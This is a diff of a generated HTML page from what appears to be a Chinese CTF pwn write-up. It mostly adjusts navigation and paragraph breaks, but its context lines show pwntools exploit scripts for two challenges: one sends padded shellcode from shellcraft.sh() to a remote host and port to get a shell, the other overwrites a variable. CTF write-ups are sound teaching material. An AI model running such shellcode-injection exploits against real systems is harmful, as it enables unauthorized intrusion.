@@ -406,6 +406,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#5variable_coverage" class="md-nav__link">
+    5.variable_coverage
+  </a>
+  
+    <nav class="md-nav" aria-label="5.variable_coverage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    变量覆盖
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -543,6 +563,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#5variable_coverage" class="md-nav__link">
+    5.variable_coverage
+  </a>
+  
+    <nav class="md-nav" aria-label="5.variable_coverage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    变量覆盖
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -645,21 +685,20 @@ p.interactive()
 <h2 id="4">4.该怎么起名呢</h2>
 <h3 id="shellcode">shellcode</h3>
 <p>题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构
-context.arch='AMD64' 
-否则有可能会报错
-再看IDA</p>
+context.arch='AMD64' ，否则有可能会报错</p>
+<p>再看IDA</p>
 <p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201019195422415.png#pic_center" /></p>
-<p>关键的在下面的buf+32
-所以我们需要填充32个字符之后再送出shellcode</p>
+<p>关键的在下面的buf+32</p>
+<p>所以我们需要填充32个字符之后再送出shellcode</p>
 <p>生成 shellcode</p>
 <blockquote>
 <p>asm(shellcraft.sh())</p>
 </blockquote>
 <p>运行一下文件</p>
 <p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center" /></p>
-<p>需要在'shellcode'之后再发送payload
-所以要recvuntil('shellcode')
-exp：</p>
+<p>需要在'shellcode'之后再发送payload</p>
+<p>所以要recvuntil('shellcode')</p>
+<p>exp：</p>
 <pre><code class="language-python">from pwn import* 
 context.arch = 'AMD64' 
 p = remote('39.101.210.214',10003)
@@ -668,8 +707,8 @@ p.recvuntil('shellcode')
 p.sendline(payload)
 p.interactive()
 </code></pre>
-<h1 id="5variable_coverage">5.variable_coverage</h1>
-<h2 id="_1">变量覆盖</h2>
+<h2 id="5variable_coverage">5.variable_coverage</h2>
+<h3 id="_1">变量覆盖</h3>
 <p>IDA分析下</p>
 <p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
 <p>程序读取%lld 一个longlong的数，它的长度为8个字节
@@ -678,8 +717,8 @@ p.interactive()
 再看栈</p>
 <p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center" /></p>
 <p>4个字节的长度刚好是0x 0000 2333 0000 0000
-也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数
-exp：</p>
+也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数</p>
+<p>exp：</p>
 <pre><code class="language-python">from pwn import* 
 
 p = remote('39.101.210.214',10007) 
